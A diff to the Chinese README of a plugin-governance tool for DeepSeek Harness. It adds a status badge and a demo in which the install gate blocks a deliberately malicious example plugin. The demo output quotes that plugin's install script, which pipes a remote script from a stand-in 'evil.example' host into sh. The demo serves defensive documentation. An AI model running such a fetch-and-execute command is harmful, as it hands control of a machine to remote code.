@@ -2,7 +2,7 @@
 
 [English](README.md) | **中文**
 
-![version](https://img.shields.io/badge/version-1.12.0-blue) ![node](https://img.shields.io/badge/node-%3E%3D%2020-green) ![license](https://img.shields.io/badge/license-MIT-lightgrey)
+![version](https://img.shields.io/badge/version-1.12.0-blue) ![node](https://img.shields.io/badge/node-%3E%3D%2020-green) ![license](https://img.shields.io/badge/license-MIT-lightgrey) ![status](https://img.shields.io/badge/status-WIP-orange)
 
 DeepSeek Harness 的插件契约与运行时治理插件。它把“插件能做什么”从口头约定变成可校验的契约：
 manifest 声明、宿主授予、运行时拦截、审计账本、安装门禁、双重签名、能力画像、离线诊断与合规准入。
@@ -10,6 +10,30 @@ manifest 声明、宿主授予、运行时拦截、审计账本、安装门禁�
 零第三方依赖，Node.js >= 20（CommonJS）。
 
 > **极速上手（DSH 桌面宿主，四步）**：profile 的 `package.json` 加依赖 `"dsh-dashcam-host": "link:<工作区>/dsh-dashcam-host"`，把 `dsh-dashcam-host` 追加进 `dsh.profile.bundles`，跑一次 `pnpm install`，重启 DeepSeek Harness 即生效。详见[极速安装](#极速安装dsh-桌面宿主)；工作区根目录的 `install-to-host.ps1` / `uninstall-from-host.ps1` 可把四步自动化。
+
+## 演示：恶意插件在安装期被拦下
+
+对仓库自带[反例包](examples/negative-plugin)跑安装门禁的真实输出——manifest 里 patch 路径越出插件目录、安装脚本把远程脚本直接管道进 `sh`（字段有省略）：
+
+```bash
+$ node bin/dsh-dashcam.js gates examples/negative-plugin --skip-signature
+{
+  "ok": false,
+  "blocked": true,
+  "plugin": "com.example.leaky",
+  "securityLabels": ["Untrusted"],
+  ...
+  "formatted": [
+    "[structure] manifest.json field=patches[0].path — patch 路径越出插件目录",
+    "[structure] manifest.json field=scripts.install — 安装脚本不在白名单：curl http://cdn.evil.example/install.sh | sh"
+  ],
+  "labelLines": [
+    "[Untrusted] — 调用方跳过验签，签名状态未知"
+  ]
+}
+```
+
+流水线 fail-fast：`structure` 门直接拦下安装，签名/安全/契约各阶段都不会再跑；每条报错都精确到字段与文件。
 
 ## 1.11.0 改名：dsh-covenant → dsh-dashcam
 
